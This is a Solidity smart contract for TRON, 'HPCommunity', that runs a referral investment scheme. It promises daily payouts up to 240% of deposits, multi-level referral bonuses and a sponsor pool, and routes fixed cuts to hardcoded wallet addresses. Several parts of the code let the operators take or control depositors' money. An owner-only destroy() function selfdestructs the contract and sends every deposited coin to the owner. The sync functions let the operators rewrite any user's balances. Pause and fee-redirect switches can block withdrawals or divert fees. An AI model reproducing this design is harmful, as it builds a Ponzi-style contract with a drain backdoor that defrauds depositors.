//SourceUnit: HPCommunity.sol

pragma solidity 0.5.8;

contract HPEX {
    function isUserExists(address user) public view returns (bool);
}

contract Destructible {
  address payable public owner;
    
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function destroy() onlyOwner public {
    selfdestruct(owner);
  }
}

contract HPCommunityCore is Destructible {
    struct Portfolio {
        address payable portfolioAddress;
        uint8 percent;
    }

    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_received_top_sponsor;
        uint256 total_received_daily_income;
        uint256 total_received_network_bonus_income;

    }

    address payable initializer;

    address payable public hpcommunityInsurance;

    mapping(address => User) public users;

    uint256[] public cycles;
    uint8[] public ref_bonuses;                     // 1 => 1%
    Portfolio[] public portfolios;

    uint8[] public pool_bonuses;                    // 1 => 1%
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    uint256 public total_received_top_sponsor;
    uint256 public total_received_daily_income;
    uint256 public total_received_network_bonus_income;


    uint8 public payoutPercent;
    bool public isPaused;
    bool public checkHpex;
    HPEX public hpex = HPEX(
        0x2Ec18E19b292090ca1BAD5357b12Ef9d92A1A8c4
    );
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount, uint8 level);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount, uint8 level);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor() public {
        isPaused = false;
        checkHpex = false;
        payoutPercent = 2;

        initializer = msg.sender;

        hpcommunityInsurance = 0x83f317A86D7A672dC81d4351c4d77039Fd4d79eb;
        
        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(2);
    

        pool_bonuses.push(30);
        pool_bonuses.push(15);
        pool_bonuses.push(10);
        pool_bonuses.push(8);
        pool_bonuses.push(8);
        pool_bonuses.push(7);
        pool_bonuses.push(7);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);

        portfolios.push(Portfolio({
            portfolioAddress: 0xAD6bE5bafe0d2d1dA7Ccd2DC03E8aE21aC8fAFEa,
            percent: 2
        }));

        portfolios.push(Portfolio({
            portfolioAddress: 0x56Fa8251303C913b7D5932D8AeD0A4B5DF48700e,
            percent: 2
        }));
        
        portfolios.push(Portfolio({
            portfolioAddress: 0x5F375F69135cE6f4ed7E2F9d89FFAA003a6f5f2E,
            percent: 2
        }));

        portfolios.push(Portfolio({
            portfolioAddress: 0xfE5E5Ad36e393335e6B1BA77B0019C247feaaA59,
            percent: 4
        }));


        portfolios.push(Portfolio({
            portfolioAddress: 0x0Cd8E652bA0ACF7E7BbBE42C14C5d908Bc455AaF,
            percent: 10
        }));
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;
        }
    }
    
    function _checkValidDepositAmount(uint256 _amount) private pure returns(bool isValid) {
        isValid = false;
        
        if (_amount == 100 trx) {
            isValid = true;
        } else if (_amount == 500 trx) {
            isValid = true;
        } else if (_amount == 1000 trx) {
            isValid = true;
        } else if (_amount == 5000 trx) {
            isValid = true;
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner || _addr == initializer, "No upline");
        
        if(checkHpex) require(hpex.isUserExists(_addr) || _addr == owner, "You need to register hpex first");
        
        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            if(!isPaused) require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _checkValidDepositAmount(_amount), "Bad amount");
        }
        else require(_checkValidDepositAmount(_amount), "Bad amount");
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);

        _refPayout(_addr, _amount);

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 7 days < block.timestamp && pool_balance > 0) {
            _drawPool();
        }

        for(uint8 i = 0; i < portfolios.length; i++) {
            portfolios[i].portfolioAddress.transfer((_amount * portfolios[i].percent) / 100);
        }
        
        hpcommunityInsurance.transfer((_amount * 5) / 100); // 5%
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 1 / 100;
        
        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += 1;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address _upline = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(_upline == address(0)) break;
            
            uint256 _bonus = (_amount * ref_bonuses[i]) / 100;
            users[_upline].match_bonus += _bonus;
            
            emit DirectPayout(_upline, _addr, _bonus, i + 1);

            _upline = users[_upline].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = (pool_balance * 20) / 100; // 20%

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
            
            uint256 _bonus = (draw_amount * pool_bonuses[i]) / 100;
            users[pool_top[i]].pool_bonus += _bonus;
            emit PoolPayout(pool_top[i], _bonus, i + 1);
        }
        
        // Reset pool
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function pause(bool paused) external {
        require(msg.sender == owner || msg.sender == initializer, "not authorized");
        isPaused = paused;
    }

    function payTopReward() external {
        require(msg.sender == owner || msg.sender == initializer, "not authorized");
        require(pool_last_draw + 7 days < block.timestamp, "Already paid for this week");
        
        if(pool_last_draw + 7 days < block.timestamp) {
            _drawPool();
        }
    }

    function setCheckHpex(bool shouldCheckHpex) external {
        require(msg.sender == owner || msg.sender == initializer, "not authorized");
        checkHpex = shouldCheckHpex;
    }

    function setInsurance(address payable insurance) external {
        require(msg.sender == owner || msg.sender == initializer, "not authorized");
        hpcommunityInsurance = insurance;
    }

    function setHpex(address newHpex) external {
        require(msg.sender == owner, "not authorized");
        hpex = HPEX(
            newHpex
        );
    }

    function setPayoutPercent(uint8 percent) external {
        require(msg.sender == owner || msg.sender == initializer, "not authorized");
        payoutPercent = percent;
    }

    function withdraw() payable external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        if(isPaused) require(users[msg.sender].payouts < users[msg.sender].deposit_amount || users[msg.sender].deposit_amount == 0 , 'not authorized');
        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            total_received_daily_income += to_payout;
            users[msg.sender].total_received_daily_income += to_payout;
        }
        
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;

            users[msg.sender].total_received_top_sponsor += pool_bonus;
            total_received_top_sponsor += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus; 
            
            total_received_network_bonus_income += match_bonus;
            users[msg.sender].total_received_network_bonus_income += match_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        if(isPaused && users[msg.sender].deposit_amount > users[msg.sender].payouts) {
            hpcommunityInsurance.transfer(to_payout * 5 / 100);
            msg.sender.transfer(to_payout * 95 / 100);
        } else if(!isPaused) {
            hpcommunityInsurance.transfer(to_payout * 5 / 100);
            msg.sender.transfer(to_payout * 95 / 100);
        }
        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 24 / 10;
    }

    function getPayoutPercent() view external returns (uint8 percent) {
        uint256 _balance = address(this).balance; 
        if (_balance < 10000000 trx) {
            return 2;
        } else if (_balance >= 10000000 trx && _balance < 15000000 trx) {
            return 3;
        } else if (_balance >= 15000000 trx && _balance < 20000000 trx) {
            return 4;
        }  else if (_balance >= 20000000 trx) {
            return 5;
        } 
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) * this.getPayoutPercent()   / 100) - users[_addr].deposit_payouts;
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    /*
        Only external call
    */

    function adminsInfo() view external returns(address first, address second, address third, address freePlatform, address trader) {
        return (portfolios[0].portfolioAddress, portfolios[1].portfolioAddress, portfolios[2].portfolioAddress, portfolios[3].portfolioAddress, portfolios[4].portfolioAddress);
    }
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts);
    }

    function userInfoExtraTotals(address _addr) view external returns(uint256 _total_received_top_sponsor, uint256 _total_received_daily_income, uint256 _total_received_network_bonus_income) {
        return (users[_addr].total_received_top_sponsor, users[_addr].total_received_daily_income, users[_addr].total_received_network_bonus_income);
    }


    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[10] memory addrs, uint256[10] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}

contract HPCommunity is HPCommunityCore {
    bool public sync_close = false;
    
    constructor(address payable _owner) public {
        owner = _owner;
    }

    function sync(address[] calldata _users, address[] calldata _uplines, uint256[] calldata _data) external {
        require(msg.sender == owner || msg.sender == initializer, "not authorized");
        require(!sync_close, "Sync already closed");

        for(uint256 i = 0; i < _users.length; i++) {
            address addr = _users[i];
            uint256 q = i * 13;

            //require(users[_uplines[i]].total_deposits > 0, "No upline");

            if(users[addr].total_deposits == 0) {
                emit Upline(addr, _uplines[i]);
            }

            users[addr].cycle = _data[q];
            users[addr].upline = _uplines[i];
            users[addr].referrals = _data[q + 1];
            users[addr].payouts = _data[q + 2];
            users[addr].pool_bonus = _data[q + 3];
            users[addr].match_bonus = _data[q + 4];
            users[addr].deposit_amount = _data[q + 5];
            users[addr].deposit_payouts = _data[q + 6];
            users[addr].deposit_time = uint40(uint40(_data[q + 7]) + 20 days);
            users[addr].total_deposits = _data[q + 8];
            users[addr].total_payouts = _data[q + 9];
            users[addr].total_received_top_sponsor = _data[q + 10];
            users[addr].total_received_daily_income = _data[q + 11];
            users[addr].total_received_network_bonus_income = _data[q + 12];
        }
    }
    
    function syncInfo(uint256 totalUsers, uint256 totalDeposited, uint256 totalWithdraw, uint256 totalTopSponsor, uint256 totalDailyIncome, uint256 totalNetwork) external onlyOwner {
        require(!sync_close, "Sync already close");

        total_users = totalUsers;
        total_deposited = totalDeposited;
        total_withdraw = totalWithdraw;
        total_received_top_sponsor = totalTopSponsor;
        total_received_daily_income = totalDailyIncome;
        total_received_network_bonus_income = totalNetwork;
    }

    function syncUp() external payable {}

    function syncClose() external {
        require(!sync_close, "Sync already close");
        require(msg.sender == owner || msg.sender == initializer, "not authorized");

        sync_close = true;
    }
}